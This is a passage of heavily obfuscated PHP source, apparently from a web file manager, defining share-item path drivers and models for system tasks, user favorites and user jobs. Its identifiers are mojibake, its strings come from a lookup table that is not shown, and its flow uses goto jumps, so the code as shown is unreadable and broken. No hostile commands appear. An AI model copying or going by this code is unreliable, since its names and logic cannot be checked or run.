$”¤‹âØü[86] => $®ö¢ªš¡); Model($”¤‹âØü[216])->where($Ï±†‰ª)->save($Ê’Ëüƒ); } $this->removeByFileID($œ¾‰‡ƒµ); if (!$æí¤´Å‰) { $±ĞÉ–Ğà->stop($ò„÷ºì); return !1; } $±ĞÉ–Ğà->end(); if ($ ‘¶åü¾ == $”¤‹âØü[1857]) { $this->remove($¤šŒıàÙ); } } public function progress($íŠŠ§ µ, $•’­Å¡š) { return Task::get($•’­Å¡š . $_SERVER[ •ŒÓîÆ][2220] . $íŠŠ§ µ); } private function removeByFileID($Â€¢ºœğ = array()) { $çü¤ŞÉÒ =& $_SERVER[ •ŒÓîÆ]; if (empty($Â€¢ºœğ)) { return; } $Ìˆıöë– = array($çü¤ŞÉÒ[520] => array($çü¤ŞÉÒ[7], $Â€¢ºœğ)); $Ï°¥ñè† = Model($çü¤ŞÉÒ[1374])->where($Ìˆıöë–)->field($çü¤ŞÉÒ[183])->select(); if (!$Ï°¥ñè†) { return; } $Ï°¥ñè† = array_to_keyvalue($Ï°¥ñè†, $çü¤ŞÉÒ[12], $çü¤ŞÉÒ[183]); foreach ($Ï°¥ñè† as $²¦ã¦«Ç) { Model($çü¤ŞÉÒ[469])->removeNow($²¦ã¦«Ç, !1); } } private function removeShareItems($øâ¯³«Ö) { $½¸¬¦Ä =& $_SERVER[ •ŒÓîÆ]; $©Öó›”Ë = "\x7b\x69\157\72{$øâ¯³«Ö}\175\x2f"; $Â¯ÈÅ = array($½¸¬¦Ä[183] => 0, $½¸¬¦Ä[1216] => array($½¸¬¦Ä[437], "{$©Öó›”Ë}\x25")); $¾¯“ÜÉş = Model($½¸¬¦Ä[1868])->where($Â¯ÈÅ)->field($½¸¬¦Ä[645])->select(); if (empty($¾¯“ÜÉş)) { return; } $³¥½®‡Ã = array_to_keyvalue($¾¯“ÜÉş, $½¸¬¦Ä[12], $½¸¬¦Ä[645]); Model($½¸¬¦Ä[644])->remove($³¥½®‡Ã); } } goto b‹œéÖ‹Ä¯; F†Ì—åêÄß: class PathDriverDriverShareItem { public function __construct($™ÅÇÎƒ×) { $this->pathParse = $™ÅÇÎƒ×; } public function __call($÷™ÙŠÄğ, $–¥½Ê) { $ã€üİĞ¨ =& $_SERVER[ •ŒÓîÆ]; if (method_exists($this, $÷™ÙŠÄğ)) { return; } $¶Í¢Ü· = call_user_func_array(array($ã€üİĞ¨[1383], $÷™ÙŠÄğ), $–¥½Ê); $‰ëÌïŞ = array($ã€üİĞ¨[1384], $ã€üİĞ¨[1385], $ã€üİĞ¨[1386], $ã€üİĞ¨[1387], $ã€üİĞ¨[598], $ã€üİĞ¨[600], $ã€üİĞ¨[1388], $ã€üİĞ¨[109], $ã€üİĞ¨[1389], $ã€üİĞ¨[1390]); if (in_array($÷™ÙŠÄğ, $‰ëÌïŞ)) { $¶Í¢Ü· = $this->getPathOuter($¶Í¢Ü·); } return $¶Í¢Ü·; } public function copy($¼Ğ çÎÆ, $ò¼‚ùÓ, $şàóÒæ» = false, $à•úºÈÅ = false) { return $this->copyMove($¼Ğ çÎÆ, $ò¼‚ùÓ, $şàóÒæ», $_SERVER[ •ŒÓîÆ][598], $à•úºÈÅ); } public function move($›êŠŠ–ó, $Ù¯æàŠ², $™Óğ’°ç = false, $ÜæóÊ”é = false) { return $this->copyMove($›êŠŠ–ó, $Ù¯æàŠ², $™Óğ’°ç, $_SERVER[ •ŒÓîÆ][600], $ÜæóÊ”é); } private function copyMove($şß‚ßÑÜ, $ñ°ŞÒº, $¶ú³èûş, $ÏØ¯ÂŒ, $¤êÜÌ× = false) { $à½ƒ²úŒ =& $_SERVER[ •ŒÓîÆ]; $¯ïé“œÒ = $ñ°ŞÒº; $û”ê®è˜ = IO::driverMake($ñ°ŞÒº); if ($û”ê®è˜->pathParse[$à½ƒ²úŒ[1192]]) { $ñ°ŞÒº = $û”ê®è˜->pathParse[$à½ƒ²úŒ[1192]]; } else { $ñ°ŞÒº = $¯ïé“œÒ; } $™ĞÓ¯¬ = IO::copyMove($şß‚ßÑÜ, $ñ°ŞÒº, $¶ú³èûş, $ÏØ¯ÂŒ, $¤êÜÌ×); $™ĞÓ¯¬ = $this->getPathOuter($™ĞÓ¯¬); return $™ĞÓ¯¬; } public function pathThis($¤‘ÑìÛÃ) { return get_path_this($this->pathParse[$_SERVER[ •ŒÓîÆ][86]]); } public function pathFather($İÔ×îÌË) { return get_path_father($this->pathParse[$_SERVER[ •ŒÓîÆ][86]]); } public function iconvSystem($‘®ÉÓŠÉ) { return $‘®ÉÓŠÉ; } protected function infoParse($Üğ”ˆŸô, $ĞÎš¿•û = false) { $Œş´ÀÜ¿ =& $_SERVER[ •ŒÓîÆ]; $ñ§ÌÕ¢‘ = $this->pathParse[$Œş´ÀÜ¿[540]][$Œş´ÀÜ¿[1216]] . $this->pathParse[$Œş´ÀÜ¿[1209]]; if ($ĞÎš¿•û) { $œš£¶Ìâ = IO::infoWithChildren($ñ§ÌÕ¢‘); } else { $œš£¶Ìâ = IO::info($ñ§ÌÕ¢‘); } $‹ã‹¢ê˜ = $this->pathParse[$Œş´ÀÜ¿[540]]; return Action($Œş´ÀÜ¿[1381])->_shareItemeParse($œš£¶Ìâ, $‹ã‹¢ê˜); } public function listAll($î¹°òÈ•) { $ç“üÂ†ƒ =& $_SERVER[ •ŒÓîÆ]; $×á£ÄĞ = IO::listAll($î¹°òÈ•); $†¤Ïƒà = rtrim($this->pathParse[$ç“üÂ†ƒ[540]][$ç“üÂ†ƒ[1216]], $ç“üÂ†ƒ[8]); foreach ($×á£ÄĞ as &$³Â¡–â‡) { $³Â¡–â‡[$ç“üÂ†ƒ[86]] = $this->pathDriver . $ç“üÂ†ƒ[8] . ltrim(substr($³Â¡–â‡[$ç“üÂ†ƒ[86]], strlen($†¤Ïƒà)), $ç“üÂ†ƒ[8]); } unset($³Â¡–â‡); return $×á£ÄĞ; } public function listAllSimple($©æÊùÌ›, $øÀš‡ˆò = false) { $Ãû„˜Ş =& $_SERVER[ •ŒÓîÆ]; $úä«£ = $this->listAll($©æÊùÌ›); $ÇÊ¾À = $this->pathParse[$Ãû„˜Ş[474]]; if (trim($ÇÊ¾À, $Ãû„˜Ş[8]) == trim(get_path_father($ÇÊ¾À), $Ãû„˜Ş[8])) { $øÀš‡ˆò = !0; } return IO::init($Ãû„˜Ş[12])->listAllSimpleMake($úä«£, $ÇÊ¾À, $øÀš‡ˆò); } public function getPathOuter($Ö›”Á®À) { $ÃåÎÃÓ =& $_SERVER[ •ŒÓîÆ]; $Ûèêı·â = KodIO::parse($Ö›”Á®À); if ($Ûèêı·â[$ÃåÎÃÓ[33]] == KodIO::KOD_SHARE_ITEM) { return $Ûèêı·â[$ÃåÎÃÓ[86]]; } $¥›µÍ³ñ = KodIO::clear($Ö›”Á®À); $ûÔîÖ‹  = KodIO::clear($this->pathParse[$ÃåÎÃÓ[540]][$ÃåÎÃÓ[1216]]); $ä’—Ñèâ = substr($¥›µÍ³ñ, strlen($ûÔîÖ‹ )); if (substr($¥›µÍ³ñ, 0, strlen($ûÔîÖ‹ )) != $ûÔîÖ‹ ) { return !1; } return $this->pathParse[$ÃåÎÃÓ[1210]] . $ÃåÎÃÓ[8] . ltrim($ä’—Ñèâ, $ÃåÎÃÓ[8]); } public function getType() { $ĞÍ´ïıº =& $_SERVER[ •ŒÓîÆ]; $Ò·´íß§ = str_replace($ĞÍ´ïıº[76], $ĞÍ´ïıº[12], get_class($this)); return strtolower($Ò·´íß§); } public function isTypeObject($ÑÉºÙàÄ) { return IO::isTypeObject($ÑÉºÙàÄ); } public function info($»³ØòŒ½) { return $this->infoParse($»³ØòŒ½); } public function infoAuth($«“ï¢ªù) { return $this->infoParse($«“ï¢ªù); } public function infoWithChildren($²‹ƒçú’) { return $this->infoParse($²‹ƒçú’, !0); } public function infoFull($”›¡ùÎ˜) { return $this->infoParse($”›¡ùÎ˜); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¯Ì¬¶Ò·) { $this->pathParse = $¯Ì¬¶Ò·; } protected function infoParse($×µÒ‘ƒí, $²ˆ•ØÍà = false) { $®ùß–ö³ =& $_SERVER[ •ŒÓîÆ]; return Action($®ùß–ö³[1215])->sharePathInfo($this->pathParse[$®ùß–ö³[86]], !0, $²ˆ•ØÍà); } public function listPath($™ûÓû”, $Úü¡“ƒÜ = false) { $ÀßâÅ”» =& $_SERVER[ •ŒÓîÆ]; $”è–˜ = IO::listPath($™ûÓû”, $Úü¡“ƒÜ); if (!$”è–˜) { return $”è–˜; } if (is_array($”è–˜[$ÀßâÅ”»[1382]])) { $›‚´æ¶¼ = Action($ÀßâÅ”»[1391])->parsePathChildren($”è–˜[$ÀßâÅ”»[1382]], array($ÀßâÅ”»[474] => $™ûÓû”)); $”è–˜[$ÀßâÅ”»[1382]] = Action($ÀßâÅ”»[1215])->shareItemInfo($›‚´æ¶¼); } foreach ($”è–˜ as $Şû¥ÇŞú => $¹ñÇÎôÓ) { if (!in_array($Şû¥ÇŞú, array($ÀßâÅ”»[85], $ÀßâÅ”»[84]))) { continue; } foreach ($¹ñÇÎôÓ as $¢š‚²ÛÀ => $›‚´æ¶¼) { $›‚´æ¶¼ = Action($ÀßâÅ”»[1391])->parsePathChildren($›‚´æ¶¼, array($ÀßâÅ”»[474] => $™ûÓû”)); $”è–˜[$Şû¥ÇŞú][$¢š‚²ÛÀ] = Action($ÀßâÅ”»[1215])->shareItemInfo($›‚´æ¶¼); } } return $”è–˜; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ë³¢¿Ì¤) { parent::__construct($ë³¢¿Ì¤); } } goto f¤¼õÈù˜¥; fŞ®…èÀã±: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\164\x61\x73\x6b\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\164\x79\x70\x65", "\x65\x76\145\156\x74", "\x74\151\155\x65", "\x64\x65\163\x63", "\x73\x79\x73\164\145\155", "\x65\156\x61\142\154\x65", "\x6c\141\x73\x74\122\165\x6e", "\x73\x6f\x72\x74"); public function listData($—àƒŠÓ = false, $şÜîÙ¼ = "\x73\157\x72\164", $œç œ®» = false) { return parent::listData($—àƒŠÓ, $şÜîÙ¼, $œç œ®»); } public function add($†­ØÚ¢µ) { $ÁâúÈÙ =& $_SERVER[ •ŒÓîÆ]; $¹¨õšñÄ = $this->findByName($†­ØÚ¢µ[$ÁâúÈÙ[32]]); if ($¹¨õšñÄ) { return !1; } $†­ØÚ¢µ[$ÁâúÈÙ[1647]] = 0; $†­ØÚ¢µ[$ÁâúÈÙ[1912]] = $this->getSort(); return parent::insert($†­ØÚ¢µ); } private function getSort() { $ºØ„ı‰— =& $_SERVER[ •ŒÓîÆ]; $Ÿû¸Îıù = parent::listData(); $¨ÅüŒâ’ = array_to_keyvalue($Ÿû¸Îıù, $ºØ„ı‰—[12], $ºØ„ı‰—[1912]); return empty($¨ÅüŒâ’) ? 0 : max($¨ÅüŒâ’) + 1; } public function update($¸Ö‹ÚÕ•, $”ŠŞ½Ï) { $Ç©Ú—­æ =& $_SERVER[ •ŒÓîÆ]; $¥Ñ„·ı = $this->listData($¸Ö‹ÚÕ•); $ÜÎş€³¡ = $this->findByName($”ŠŞ½Ï[$Ç©Ú—­æ[32]]); if (!$¥Ñ„·ı || $ÜÎş€³¡ && $ÜÎş€³¡[$Ç©Ú—­æ[453]] != $¥Ñ„·ı[$Ç©Ú—­æ[453]]) { return !1; } return parent::update($¸Ö‹ÚÕ•, $”ŠŞ½Ï); } public function remove($”àÙŒë, $ñ•í«‚¤ = false) { $±Ø‘–ñ¤ =& $_SERVER[ •ŒÓîÆ]; $š‘˜‘Š† = $this->listData($”àÙŒë); if (!$š‘˜‘Š†) { return; } if (!$ñ•í«‚¤ && $š‘˜‘Š†[$±Ø‘–ñ¤[181]] == $±Ø‘–ñ¤[90]) { return !1; } return parent::remove($”àÙŒë); } public function enable($ÈÁÛè, $²¨ĞŠÉŸ) { return $this->update($ÈÁÛè, array($_SERVER[ •ŒÓîÆ][2324] => $²¨ĞŠÉŸ)); } public function run($¶•›½±ª) { return $this->update($¶•›½±ª, array($_SERVER[ •ŒÓîÆ][2336] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($ªñš¥¡) { $Œ¥›å‰Â =& $_SERVER[ •ŒÓîÆ]; return array($Œ¥›å‰Â[1999] => array(USER_ID, $Œ¥›å‰Â[2337])); } protected function listData() { $Í–¿Ç‡ =& $_SERVER[ •ŒÓîÆ]; $‡©ÍÓœ½ = array($Í–¿Ç‡[1681] => USER_ID, $Í–¿Ç‡[537] => 0); $²‡Ãƒ— = $Í–¿Ç‡[2338]; $Ó÷¿ß = $this->field($²‡Ãƒ—)->where($‡©ÍÓœ½)->order($Í–¿Ç‡[2339])->select(); return $Ó÷¿ß ? $Ó÷¿ß : array(); } protected function resetCache() { } protected function listView() { $¡ô¸ûÚ¡ =& $_SERVER[ •ŒÓîÆ]; $†âûËü¶ = $this->listData(); $ƒ˜Šáğ› = array_filter_by_field($†âûËü¶, $¡ô¸ûÚ¡[33], $¡ô¸ûÚ¡[469]); $Ø„³Ã Ÿ = array_to_keyvalue($ƒ˜Šáğ›, $¡ô¸ûÚ¡[12], $¡ô¸ûÚ¡[86]); if (!$Ø„³Ã Ÿ) { return $†âûËü¶; } $ôÊËü ı = 2000; $šßº²êÍ = array($¡ô¸ûÚ¡[470] => array($¡ô¸ûÚ¡[471], $Ø„³Ã Ÿ)); $èÆ¼ˆÏ = Model($¡ô¸ûÚ¡[866])->listSource($šßº²êÍ, $ôÊËü ı); $èÆ¼ˆÏ = array_merge($èÆ¼ˆÏ[$¡ô¸ûÚ¡[85]], $èÆ¼ˆÏ[$¡ô¸ûÚ¡[84]]); $èÆ¼ˆÏ = array_to_keyvalue($èÆ¼ˆÏ, $¡ô¸ûÚ¡[183]); foreach ($†âûËü¶ as $§œ†Ãâ… => $± ùºõş) { $©õóŞ˜§ = $èÆ¼ˆÏ[$± ùºõş[$¡ô¸ûÚ¡[86]]]; $©õóŞ˜§ = $©õóŞ˜§ ? $©õóŞ˜§ : array(); $†âûËü¶[$§œ†Ãâ…] = array_merge($©õóŞ˜§, $± ùºõş); } return $†âûËü¶; } protected function addFav($Ù‡‰üªş, $¨ŸåÈı = '', $ë­şÜÕ« = "\x73\157\165\x72\143\145") { $ä®È§¤À =& $_SERVER[ •ŒÓîÆ]; $Êâèû¿Â = array($ä®È§¤À[1681] => USER_ID, $ä®È§¤À[537] => 0, $ä®È§¤À[475] => $ë­şÜÕ«, $ä®È§¤À[474] => $Ù‡‰üªş); if ($this->where($Êâèû¿Â)->find()) { return !1; } $Êâèû¿Â = array($ä®È§¤À[1681] => USER_ID, $ä®È§¤À[537] => 0); $øÑÜä¯€ = $this->where($Êâèû¿Â)->max($ä®È§¤À[1912]); if (!$øÑÜä¯€) { $øÑÜä¯€ = 0; } if (!$¨ŸåÈı && $ë­şÜÕ« == $ä®È§¤À[469]) { $Òğ¯œ® = Model($ä®È§¤À[1374])->where(array($ä®È§¤À[470] => $Ù‡‰üªş))->find(); if (!$Òğ¯œ®) { return !1; } $¨ŸåÈı = $Òğ¯œ®[$ä®È§¤À[32]]; } $¨ŸåÈı = $this->getAutoName($¨ŸåÈı); $Ú¿ÂÂ´« = array($ä®È§¤À[1681] => USER_ID, $ä®È§¤À[537] => 0, $ä®È§¤À[473] => $¨ŸåÈı, $ä®È§¤À[474] => $Ù‡‰üªş, $ä®È§¤À[475] => $ë­şÜÕ«, $ä®È§¤À[1892] => $øÑÜä¯€ + 1); return $this->add($Ú¿ÂÂ´«); } protected function remove($¥Æ¸ßãá) { $‡ûÃé±Ë =& $_SERVER[ •ŒÓîÆ]; $ôˆ§‚›¥ = array($‡ûÃé±Ë[1681] => USER_ID, $‡ûÃé±Ë[472] => $¥Æ¸ßãá); return $this->where($ôˆ§‚›¥)->delete(); } protected function removeByName($æƒ‰¥) { $Ï§¨ËÙ =& $_SERVER[ •ŒÓîÆ]; $”Ğ©¼§÷ = array($Ï§¨ËÙ[1681] => USER_ID, $Ï§¨ËÙ[473] => $æƒ‰¥, $Ï§¨ËÙ[537] => 0); return $this->where($”Ğ©¼§÷)->delete(); } protected function rename($º¾…Ë, $Ú·ÕåÁ´) { $øåˆ€–Ÿ =& $_SERVER[ •ŒÓîÆ]; if ($º¾…Ë == $Ú·ÕåÁ´) { return !1; } $ø••‰÷Î = $this->getAutoName($Ú·ÕåÁ´); if ($Ú·ÕåÁ´ != $ø••‰÷Î) { return !1; } $ÓáïŒ = array($øåˆ€–Ÿ[1681] => USER_ID, $øåˆ€–Ÿ[537] => 0, $øåˆ€–Ÿ[32] => $º¾…Ë); return $this->where($ÓáïŒ)->save(array($øåˆ€–Ÿ[32] => $Ú·ÕåÁ´)); } protected function resetSort($µ„÷âÌã) { $¤ƒÚÑÉ¸ =& $_SERVER[ •ŒÓîÆ]; $µ„÷âÌã = is_array($µ„÷âÌã) ? $µ„÷âÌã : array(); $œ”³¸³Ì = array($¤ƒÚÑÉ¸[1681] => USER_ID); for ($µÃªõÓ£ = 0; $µÃªõÓ£ < count($µ„÷âÌã); $µÃªõÓ£++) { $œ”³¸³Ì[$¤ƒÚÑÉ¸[472]] = $µ„÷âÌã[$µÃªõÓ£]; $this->where($œ”³¸³Ì)->save(array($¤ƒÚÑÉ¸[1892] => $µÃªõÓ£ + 1)); } return !0; } protected function moveTop($ùåŠÍáá) { $ø†ÏëÁ„ =& $_SERVER[ •ŒÓîÆ]; $öÜøØ› = array($ø†ÏëÁ„[1681] => USER_ID, $ø†ÏëÁ„[537] => 0); $’í¥Ã‡ = $this->where($öÜøØ›)->where(array($ø†ÏëÁ„[32] => $ùåŠÍáá))->find(); if (!$’í¥Ã‡) { return; } $Œ«÷‘¾ = $this->field($ø†ÏëÁ„[453])->where($öÜøØ›)->order($ø†ÏëÁ„[2339])->select(); $Œ«÷‘¾ = array_to_keyvalue($Œ«÷‘¾, $ø†ÏëÁ„[12], $ø†ÏëÁ„[453]); $İä«©Îû = $Œ«÷‘¾; $Œ«÷‘¾ = array_remove_value($Œ«÷‘¾, $’í¥Ã‡[$ø†ÏëÁ„[453]]); array_unshift($Œ«÷‘¾, $’í¥Ã‡[$ø†ÏëÁ„[453]]); return $this->resetSort($Œ«÷‘¾); } protected function moveBottom($‚ó¶öµ›) { $ˆ“Ê¾Òà =& $_SERVER[ •ŒÓîÆ]; $áµÚòì¼ = array($ˆ“Ê¾Òà[1681] => USER_ID, $ˆ“Ê¾Òà[537] => 0); $¹‚Ş”¢“ = $this->where($áµÚòì¼)->max($ˆ“Ê¾Òà[1912]); $‚¢¿üÍ¼ = array($ˆ“Ê¾Òà[1912] => $¹‚Ş”¢“ + 1); return $this->where($áµÚòì¼)->where(array($ˆ“Ê¾Òà[32] => $‚ó¶öµ›))->save($‚¢¿üÍ¼); } private function getAutoName($Ø‡ù¿ú²) { $Ï»®‹ÀÀ =& $_SERVER[ •ŒÓîÆ]; $Å‡ÙŒÂÉ = array($Ï»®‹ÀÀ[1681] => USER_ID, $Ï»®‹ÀÀ[537] => 0); $Ñ“¤©é = $this->field($Ï»®‹ÀÀ[32])->where($Å‡ÙŒÂÉ)->select(); $Ñ“¤©é = array_to_keyvalue($Ñ“¤©é, $Ï»®‹ÀÀ[12], $Ï»®‹ÀÀ[32]); if (!$Ñ“¤©é || !in_array($Ø‡ù¿ú², $Ñ“¤©é)) { return $Ø‡ù¿ú²; } for ($çÕ»¹ıì = 0; $çÕ»¹ıì < count($Ñ“¤©é); $çÕ»¹ıì++) { if (!in_array($Ø‡ù¿ú² . "\50{$çÕ»¹ıì}\x29", $Ñ“¤©é)) { return $Ø‡ù¿ú² . "\50{$çÕ»¹ıì}\51"; } } return $Ø‡ù¿ú² . "\50{$çÕ»¹ıì}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\152\x6f\x62\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\144\x65\163\x63", "\163\x6f\162\164"); const JOB_KEY = "\x73\145\x6c\x66\112\x6f\142\114\151\163\164"; public function listData($—È øº¸ = false, $áŠ°”ªÁ = "\163\x6f\162\164", $Úà÷¶Ø¤ = false) { return parent::listData($—È øº¸, $áŠ°”ªÁ, $Úà÷¶Ø¤); } public function remove($ Øº‚ŞÜ) { return parent::remove($ Øº‚ŞÜ); } public function add($£Áë‡’) { $ˆšìôŞî =& $_SERVER[ •ŒÓîÆ]; if ($this->findByName($£Áë‡’[$ˆšìôŞî[32]])) { return !1; } $£Áë‡’[$ˆšìôŞî[1912]] = $this->getSort(); return parent::insert($£Áë‡’); } private function getSort() { $ŞÛèÍÓ‚ =& $_SERVER[ •ŒÓîÆ]; $½€ŒÏ† = parent::listData(); $û±µ½ÚÖ = array_to_keyvalue($½€ŒÏ†, $ŞÛèÍÓ‚[12], $ŞÛèÍÓ‚[1912]); return empty($û±µ½ÚÖ) ? 0 : max($û±µ½ÚÖ) + 1; } public function update($æ‘ÅÊ¦‚, $ÄïĞ“÷) { $¤–¡¥×× =& $_SERVER[ •ŒÓîÆ]; $ğÆ†¸²… = parent::listData($æ‘ÅÊ¦‚); $»òª¶Ôà = $this->findByName($ÄïĞ“÷[$¤–¡¥××[32]]); if (!$ğÆ†¸²… || $»òª¶Ôà && $»òª¶Ôà[$¤–¡¥××[453]] != $ğÆ†¸²…[$¤–¡¥××[453]]) { return !1; } return parent::update($æ‘ÅÊ¦‚, $ÄïĞ“÷); } public function setUserJob($³íİ”å·, $‘²ùÔ) { $¢Æ—‚œ¬ =& $_SERVER[ •ŒÓîÆ]; if (!is_array($‘²ùÔ)) { $‘²ùÔ = array($‘²ùÔ); } $Æ °òÅÅ = parent::listData(); $ò¿ß„¶ = array_to_keyvalue($Æ °òÅÅ, $¢Æ—‚œ¬[32]); $Å’æé‹¿ = $¢Æ—‚œ¬[263]; foreach ($‘²ùÔ as $ÈË´ó¾™) { if ($ò¿ß„¶[$ÈË´ó¾™]) { $Å’æé‹¿ .= $ò¿ß„¶[$ÈË´ó¾™][$¢Æ—‚œ¬[453]] . $¢Æ—‚œ¬[50]; } else { $·‹şéÑæ = $this->add($ÈË´ó¾™); $Å’æé‹¿ .= $·‹şéÑæ . $¢Æ—‚œ¬[50]; } } $Å’æé‹¿ = rtrim($Å’æé‹¿, $¢Æ—‚œ¬[50]); Model($¢Æ—‚œ¬[579])->metaSet($³íİ”å·, self::JOB_KEY, $Å’æé‹¿); } public function getUserJob($Ğë´ÏÓ÷) { $‚Âíà = Model($_SERVER[ •ŒÓîÆ][579])->metaGet($Ğë´ÏÓ÷); return $this->getUserJobInfo($‚Âíà[self::JOB_KEY]); } public function getUserJobInfo($´Öê†ê¨) { $¢ôï‹şº =& $_SERVER[ •ŒÓîÆ]; $ŒûŒ–Àì = explode($¢ôï‹şº[50], $´Öê†ê¨); $•ôí´Êü = parent::listData(); $•ôí´Êü = array_remove_key($•ôí´Êü, $¢ôï‹şº[217]); $œ˜¤¡£ = array(); foreach ($ŒûŒ–Àì as $ì§Òß¯â) { if (isset($•ôí´Êü[$ì§Òß¯â])) { $œ˜¤¡£[] = $•ôí´Êü[$ì§Òß¯â]; } } return $œ˜¤¡£; } } goto A¼«£’®°; FæäÛ‰²À: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÄĞØƒõó =& $_SERVER[ •ŒÓîÆ]; $this->objectDriver = array($ÄĞØƒõó[60], $ÄĞØƒõó[61], $ÄĞØƒõó[62], $ÄĞØƒõó[63], $ÄĞØƒõó[64], $ÄĞØƒõó[65], $ÄĞØƒõó[66], $ÄĞØƒõó[67], $ÄĞØƒõó[68], $ÄĞØƒõó[69], $ÄĞØƒõó[70]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Æúİúª) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Æúİúª, $_SERVER[ •ŒÓîÆ][8]); } return $Æúİúª; } public function iconvApp($ş÷å²Ÿ) { return $ş÷å²Ÿ; } public function iconvSystem($·Í¡€¿Í) { return $·Í¡€¿Í; } public function iconvTo($ºªÇôŸ¤, $—¶Œà‰Ó, $§§¤íõà) { $‘Äï‡—¥ =& $_SERVER[ •ŒÓîÆ]; if (!$ºªÇôŸ¤ || !function_exists($‘Äï‡—¥[71])) { return $ºªÇôŸ¤; } static $Œï™Àñ• = array(); $‰¬ïÅ­ñ = $—¶Œà‰Ó . $‘Äï‡—¥[72] . $§§¤íõà . $‘Äï‡—¥[73] . $ºªÇôŸ¤; if (isset($Œï™Àñ•[$‰¬ïÅ­ñ])) { return $Œï™Àñ•[$‰¬ïÅ­ñ]; } if (function_exists($‘Äï‡—¥[74])) { $òÌû°ç = @mb_convert_encoding($ºªÇôŸ¤, $§§¤íõà, $—¶Œà‰Ó); } else { $òÌû°ç = @iconv($—¶Œà‰Ó, $§§¤íõà, $ºªÇôŸ¤); } $òÌû°ç = $òÌû°ç ? $òÌû°ç : $ºªÇôŸ¤; if (strstr($òÌû°ç, $‘Äï‡—¥[75])) { $òÌû°ç = str_replace($‘Äï‡—¥[75], $‘Äï‡—¥[11], $òÌû°ç); } $Œï™Àñ•[$—¶Œà‰Ó . $‘Äï‡—¥[72] . $§§¤íõà . $‘Äï‡—¥[73] . $ºªÇôŸ¤] = $òÌû°ç; $Œï™Àñ•[$§§¤íõà . $‘Äï‡—¥[72] . $—¶Œà‰Ó . $‘Äï‡—¥[73] . $ºªÇôŸ¤] = $ºªÇôŸ¤; $Œï™Àñ•[$§§¤íõà . $‘Äï‡—¥[72] . $—¶Œà‰Ó . $‘Äï‡—¥[73] . $òÌû°ç] = $ºªÇôŸ¤; $Œï™Àñ•[$—¶Œà‰Ó . $‘Äï‡—¥[72] . $§§¤íõà . $‘Äï‡—¥[73] . $òÌû°ç] = $òÌû°ç; return $òÌû°ç; } public function getPathInner($†Á™İ¤Ï) { $ï¿Å´—Ù = IO::init($†Á™İ¤Ï); return $ï¿Å´—Ù->path; } public function getPathOuter($´ûÜšóâ) { $„—¢»¼¬ =& $_SERVER[ •ŒÓîÆ]; $‘ƒºò½ = strlen(trim($this->pathBase, $„—¢»¼¬[8])); $´ûÜšóâ = substr(trim($´ûÜšóâ, $„—¢»¼¬[8]), $‘ƒºò½); return $this->pathDriver . $„—¢»¼¬[8] . ltrim($´ûÜšóâ, $„—¢»¼¬[8]); } public function isParentOf($‘¾«Ğ¯, $ÃàÄÁËù) { $º• Óº÷ =& $_SERVER[ •ŒÓîÆ]; $‘¾«Ğ¯ = rtrim(strtolower($‘¾«Ğ¯), $º• Óº÷[8]) . $º• Óº÷[8]; $ÃàÄÁËù = rtrim(strtolower($ÃàÄÁËù), $º• Óº÷[8]) . $º• Óº÷[8]; $¦ÔîØ¯´ = strpos($ÃàÄÁËù, $‘¾«Ğ¯) === 0; return $¦ÔîØ¯´; } public function getType() { $Ö«ÎŞÍÆ =& $_SERVER[ •ŒÓîÆ]; $½Şã®ƒÂ = str_replace($Ö«ÎŞÍÆ[76], $Ö«ÎŞÍÆ[12], get_class($this)); return strtolower($½Şã®ƒÂ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($·•‚Ïã×, $Ÿçíˆ¼) { $µİµô–Ì =& $_SERVER[ •ŒÓîÆ]; $ğ¡¿”Î¶ = rtrim($·•‚Ïã×, $µİµô–Ì[8]) . $µİµô–Ì[8] . $Ÿçíˆ¼; $‡±šÖñÈ = $this->exist($ğ¡¿”Î¶); return $‡±šÖñÈ ? $ğ¡¿”Î¶ : !1; } public function setModifyTime($‡”·ÒÃ, $¦ÀĞéŠ¶ = '') { } public function renameObject($·üÔÒ–Ê, $¦Ö’ëİ÷) { $ŒØâ€Ó¼ = $¦Ö’ëİ÷; $·üÔÒ–Ê = $this->getPathOuter($·üÔÒ–Ê); $¦Ö’ëİ÷ = $this->pathFather($·üÔÒ–Ê) . $¦Ö’ëİ÷; $ÑğÂ´‹º = IO::copy($·üÔÒ–Ê, $this->pathFather($·üÔÒ–Ê), REPEAT_RENAME_FOLDER, $ŒØâ€Ó¼); if ($ÑğÂ´‹º) { IO::remove($·üÔÒ–Ê); } return $ÑğÂ´‹º ? $¦Ö’ëİ÷ : !1; } public function tempFile($÷çÂ«ŒÊ = '', $ßí‰ì¶ = '') { if (!$÷çÂ«ŒÊ) { $÷çÂ«ŒÊ = rand_string(15); } $æ¯úêŒ = TEMP_FILES . rand_string(15) . $_SERVER[ •ŒÓîÆ][8]; @mkdir($æ¯úêŒ, DEFAULT_PERRMISSIONS, !0); $ Êø×– = $æ¯úêŒ . $÷çÂ«ŒÊ; @touch($ Êø×–); if ($ßí‰ì¶) { file_put_contents($ Êø×–, $ßí‰ì¶); } return $ Êø×–; } public function tempFileRemve($òşÄŞÑÄ) { @unlink($òşÄŞÑÄ); @rmdir($this->pathFather($òşÄŞÑÄ)); } public function mkfile($à×®ÉÖ, $ŠÔ’İÍå = '', $êªØœª = REPEAT_RENAME) { } public function mkdir($’‘È‹Ô, $ıÃÙó¸ = REPEAT_SKIP) { } public function delFile($°¡œ°ôÅ) { } public function delFolder($±×êÄ) { } public function copyFile($“·‰„»œ, $Ó­òÕŒá) { } public function moveFile($¬×ì—ªŒ, $¾ßÕÉë¦) { } public function remove($©îò—Ãú) { if ($this->isFile($©îò—Ãú)) { return $this->delFile($©îò—Ãú); } return $this->delFolder($©îò—Ãú); } public function rename($¦»˜”ÀÜ, $¶–Ïó¡Å) { } 